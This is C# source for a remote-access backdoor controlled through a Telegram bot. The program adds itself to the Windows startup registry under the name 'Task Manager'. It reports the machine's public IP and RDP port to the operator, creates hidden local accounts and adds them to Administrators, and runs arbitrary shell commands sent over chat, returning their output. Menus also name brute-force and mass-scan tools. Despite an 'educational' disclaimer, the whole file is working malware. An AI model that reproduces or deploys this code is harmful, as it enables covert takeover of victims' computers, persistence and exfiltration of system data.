using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types;
using Telegram.Bot.Types.ReplyMarkups;
using System.Runtime.InteropServices;

namespace BackDoor_PRO
{
    class Program
    {
        //Coded By FreeMan - Telegram @FreeMen11
        //All Right Reserverd 2020
        //Just For Educational Uses


        private static ITelegramBotClient botClient;
        private static string botToken = "Your Bot Token Here";
     
        #region Variables
        private static string name;
        private static string label;
        private static string free1;
        private static string diarectry;
        private static string free;
        private static string total;      
        private static string Cores;
        private static string logicalcore;
        private static string tosend;  
        private static string outa;
        private static string userpass;
        private static string user;       
        private static bool onnewuser = false;
        private static bool onaddto = false;
        private static bool onexcutecmd = false;
        private static string cmdcommand;
        private static ReplyKeyboardMarkup admin_key;
        private static ReplyKeyboardMarkup info;
        private static ReplyKeyboardMarkup other;
        #endregion       
      
        static void Main(string[] args)
        {
            #region AddToStartUP
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
         ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("Task Manager", Assembly.GetEntryAssembly().Location);
            #endregion
            try
            {                
                #region needblesettings
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                #endregion
                #region KeyboradButtos
                admin_key = new ReplyKeyboardMarkup
                {
                    Keyboard = new KeyboardButton[][]
                    {
                        new KeyboardButton[]
                        {
                            "🧬 Get IP Address 🧬"
                        },
                        new KeyboardButton[]
                        {
                            "📨 New User",
                            "⛓ Server Info"
                        },
                        new KeyboardButton[]
                        {
                            "📎 Execute CMD Command"
                        },
                        
                        new KeyboardButton[]
                        {
                            "📊 About", "🌐 Other"
                        }
                    },
                    OneTimeKeyboard = true,
                    ResizeKeyboard = true
                };

                info = new ReplyKeyboardMarkup
                {
                    Keyboard = new KeyboardButton[][]
                    {
                        new KeyboardButton[]
                        {
                            "📡 CPU"
                        },
                        new KeyboardButton[]
                        {
                            "🗂 Ram",
                            "📦 Disk"
                        },
                        new KeyboardButton[]
                        {
                            "⬅️ Back"
                        }                       
                       
                    },
                    OneTimeKeyboard = true,
                    ResizeKeyboard = true
                };

                other = new ReplyKeyboardMarkup
                {
                    Keyboard = new KeyboardButton[][]
                    {
                        new KeyboardButton[]
                        {
                            "🧲 NLBrute"
                        },
                        new KeyboardButton[]
                        {
                            "🛡 MassScan",
                            "🖇 Chrome"
                        },
                        new KeyboardButton[]
                        {
                            "⬅️ Back"
                        }                       
                       
                    },
                    OneTimeKeyboard = true,
                    ResizeKeyboard = true
                    
                };
                #endregion
                #region Botconf
                botClient = new TelegramBotClient(botToken);
                User result = Program.botClient.GetMeAsync(default(CancellationToken)).Result;
                Console.WriteLine("Loaded With No Problem! Bot Username: @{0} And Name {1}.", result.Username, result.FirstName);
                botClient.OnMessage += Bot_OnMessage;
                botClient.StartReceiving(null, default(CancellationToken));                
                Thread.Sleep(int.MaxValue);
                #endregion
            }

            catch (Exception ex)
            {
                
            }
        }
        private static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {

            #region Start
            if (e.Message.Text == "/start")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id ,"Welcome to BackDoor Bot *V1.0*" , Telegram.Bot.Types.Enums.ParseMode.Markdown , replyMarkup:admin_key);
            }
            #endregion


            #region IPPort
            if (e.Message.Text == "🧬 Get IP Address 🧬")
            {
                try
                {

                    string ip = GetLocalIPAddress();
                    string Port = GetPortNumber();
                    if(System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
                    {
                        if (Port == "RDP is not enabled.")
                        {
                            await botClient.SendTextMessageAsync(e.Message.Chat.Id, "Sorry RDP Is *Off*", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                        }
                        else
                        {
                            await botClient.SendTextMessageAsync(e.Message.Chat.Id, string.Format("The IP Address is: {0} | RDP Going On Port: {1}", ip, Port), Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                        }
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(e.Message.Chat.Id, "The Server Is Not Connected To Internet!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                    }

                }
                catch
                { }
            }
            #endregion


            #region User

            if (e.Message.Text == "📨 New User")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, @"Send User And Password Like this: User:Password
*Note: You Have To Reply This Message*", Telegram.Bot.Types.Enums.ParseMode.Markdown);
                onnewuser = true;
               
            }

            if(e.Message.ReplyToMessage != null && e.Message.Text.Contains(":") && onnewuser == true)
            {
                userpass = e.Message.Text;
                string[] Cri = userpass.Split(':');
                user = Cri[0];
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Verb = "runas";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.Arguments = string.Format("/C Net user {0} {1} /add" , Cri[0] , Cri[1]);
                process.StartInfo = startInfo;
                process.Start();
                
                string errotoutput = process.StandardError.ReadToEnd();
                string output = process.StandardOutput.ReadToEnd();
                if(output == "" || output == null)
                {
                    outa = errotoutput;
                }
                else
                {
                    outa = output;
                }
                
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "The Respond Is: \n" + outa, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                if(output != "" || output != null)
                {
                    await botClient.SendTextMessageAsync(e.Message.Chat.Id, "Let's Add This User To Administrators Users OK? \n Reply And Send *Yes* Or *No*" , Telegram.Bot.Types.Enums.ParseMode.Markdown);
                    onaddto = true;
                }
                
                onnewuser = false;
            }
            if (e.Message.ReplyToMessage != null && onaddto == true)
            {
                if(e.Message.Text == "Yes")
                {
                    //net localgroup administrators username /add
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.FileName = "cmd.exe";
                    startInfo.Verb = "runas";
                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.Arguments = string.Format("/C net localgroup administrators {0} /add", user);
                    process.StartInfo = startInfo;
                    process.Start();
                    string errotoutput = process.StandardError.ReadToEnd();
                    string output = process.StandardOutput.ReadToEnd();
                    if (output == "" || output == null)
                    {
                        outa = errotoutput;
                    }
                    else
                    {
                        outa = output;
                    }

                    await botClient.SendTextMessageAsync(e.Message.Chat.Id, "The Respond Is: \n" + outa, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                    onaddto = false;
                }
                else if(e.Message.Text == "No")
                {
                    await botClient.SendTextMessageAsync(e.Message.Chat.Id, "OK No Problem You Can Do It On CMD Commands", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
                    onaddto = false;
                }               
               
            }
            #endregion


            #region Info
            if (e.Message.Text == "⛓ Server Info")
            {               
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "All Info Here!", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: info);
            }
            if (e.Message.Text == "📡 CPU")
            {
              
                ManagementObjectSearcher myProcessorObject = new ManagementObjectSearcher("select * from Win32_Processor");
                foreach (ManagementObject obj in myProcessorObject.Get())
                {
                     name = "Name  -  " + obj["Name"].ToString();
                    
                     Cores = "NumberOfCores  -  " + obj["NumberOfCores"].ToString();
                     logicalcore = "NumberOfLogicalProcessors  -  " + obj["NumberOfLogicalProcessors"].ToString();   

                }
                tosend = name + "\n" +  Cores + "\n" + logicalcore;
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, tosend , Telegram.Bot.Types.Enums.ParseMode.Markdown , replyMarkup:info);
            }
            if (e.Message.Text == "🗂 Ram")
            {
                ulong InstalledRam = GetTotalMemoryInBytes();
                double ram = ((float)InstalledRam) / (1024.0 * 1024.0 * 1024.0);
                double raam = Math.Ceiling(ram);
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "The installed Ram is: " + raam.ToString()+ "GB", Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: info);
            }

            if(e.Message.Text == "📦 Disk")
            {
                try
                {
                    DriveInfo[] allDrives = DriveInfo.GetDrives();

                    foreach (DriveInfo d in allDrives)
                    {
                        Console.WriteLine("Drive {0}", d.Name);
                        Console.WriteLine("  Drive type: {0}", d.DriveType);
                        if (d.IsReady == true)
                        {
                            label = "Volume label: " + d.VolumeLabel;
                            free = "Available space to current user: " + SizeSuffix(d.AvailableFreeSpace);
                            free1 = "Total available space: " + SizeSuffix(d.TotalFreeSpace);
                            total = "Total size of drive: " + SizeSuffix(d.TotalSize);
                            diarectry = " Root directory: " + d.RootDirectory;
                            tosend += label + "\n" + free + "\n" + free1 + "\n" + total + "\n" + diarectry + "\n" + "===================" + "\n";
                        }
                    }
                }
                finally
                {                   
                    await botClient.SendTextMessageAsync(e.Message.Chat.Id, "Disk Info Is: \n" + tosend, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: info);
                }
            }
            if(e.Message.Text == "⬅️ Back")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "You're In MainMenu" , Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
            }
            #endregion


            #region CMDCommands

            
            if (e.Message.ReplyToMessage != null && onexcutecmd == true)
            {
                cmdcommand = e.Message.Text;
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Verb = "runas";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.Arguments = string.Format("/C " + cmdcommand);
                process.StartInfo = startInfo;
                process.Start();

                string errotoutput = process.StandardError.ReadToEnd();
                string output = process.StandardOutput.ReadToEnd();
                if (output == "" || output == null)
                {
                    outa = errotoutput;
                }
                else
                {
                    outa = output;
                }
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "The Respond Is: \n" + outa, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
            }



            if (e.Message.Text == "📎 Execute CMD Command")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, @"Send Your CMD Command!
*Note: Dont Forget To Reply This Message!*", Telegram.Bot.Types.Enums.ParseMode.Markdown);
                onexcutecmd = true;
            }
            #endregion

            
            #region About 

            if (e.Message.Text == "📊 About")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, " 〽️ Developed By FreeMan \n 📱 Please Send Problems And Suggestion To @FreeMen11" + outa, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
            }
            #endregion


            #region Other

            if(e.Message.Text == "🌐 Other")
            {
                await botClient.SendTextMessageAsync(e.Message.Chat.Id, "Sorry There is Nothing Here! \n Other Will Add Soon!" + outa, Telegram.Bot.Types.Enums.ParseMode.Markdown, replyMarkup: admin_key);
            }



            #endregion

        }

        #region ConvertSize
        static readonly string[] SizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

        static string SizeSuffix(Int64 value)
        {
            if (value < 0) { return "-" + SizeSuffix(-value); }
            if (value == 0) { return "0.0 bytes"; }

            int mag = (int)Math.Log(value, 1024);
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            return string.Format("{0:n1} {1}", adjustedSize, SizeSuffixes[mag]);
        }
        #endregion

        #region GetIPPort
        private static string GetPortNumber()
        {
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", false))
            {
                if (key is null)
                {
                    return "RDP is not enabled.";                    
                }
                else
                {
                    int port = (int)key.GetValue("PortNumber", 3389);
                    return port.ToString();
                }
            }
        }
        public static string GetLocalIPAddress()
        {
            using (WebClient client = new WebClient()) // WebClient class inherits IDisposable
            {
                string IPAddress = client.DownloadString("https://api.ipify.org/");
                return IPAddress;
            }
        }
        #endregion

        #region Memory
        static ulong GetTotalMemoryInBytes()
        {
            return new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
        }
        #endregion
    }
}
